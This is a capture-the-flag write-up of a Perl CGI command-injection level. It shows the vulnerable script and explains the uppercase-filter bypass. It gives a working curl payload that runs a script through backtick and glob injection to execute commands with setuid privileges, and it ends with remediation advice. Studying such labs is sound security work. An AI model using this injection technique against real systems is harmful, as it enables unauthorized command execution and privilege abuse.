# Level 12 — CGI Perl Script: Command Injection via Backtick Interpolation and Uppercase Bypass

## Overview

A Perl CGI script runs on `localhost:4646`. It accepts two GET parameters (`x` and `y`), applies basic input sanitization on `x`, then passes it unsanitized into a shell command via backtick interpolation.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

## Source Code Analysis
```perl
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

Two filters are applied on parameter `x`:
- All lowercase letters are converted to uppercase
- Everything after the first whitespace is removed

These filters appear to prevent direct command injection, but they do not strip shell metacharacters such as backticks or glob characters.
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

`$xx` is interpolated directly into a shell command without sanitization. The backtick operator causes Perl to pass the string to `/bin/sh`, which evaluates any embedded shell syntax before `egrep` runs.

## Vulnerability

The filters block lowercase commands like `` `getflag` `` (converted to `` `GETFLAG` ``), but do not block backticks or glob patterns. This allows injecting a shell subexpression that survives the uppercase transformation — as long as the target command or path is already uppercase.

## Exploitation

Create a script with an uppercase filename in `/tmp/`, which `egrep` can reach via a bash glob:
```bash
echo "getflag > /tmp/f" > /tmp/SCRIPT
chmod 777 /tmp/SCRIPT
curl 'localhost:4646?x=`/*/SCRIPT`'
cat /tmp/f
```

**Why this works:**
- `/*/SCRIPT` uses a glob that bash expands to `/tmp/SCRIPT` at shell evaluation time
- The uppercase filename survives the `tr/a-z/A-Z/` filter unchanged
- The backticks cause the shell to execute `/tmp/SCRIPT` before `egrep` is called
- The CGI server runs with `flag12` privileges (setuid), so `getflag` succeeds

## Remediation

- Never interpolate user input directly into shell commands — use `open()` with a list form or Perl's `File::Grep` module
- Strip all shell metacharacters from input, not just alphanumeric ranges
- Run CGI scripts with the minimum required privileges
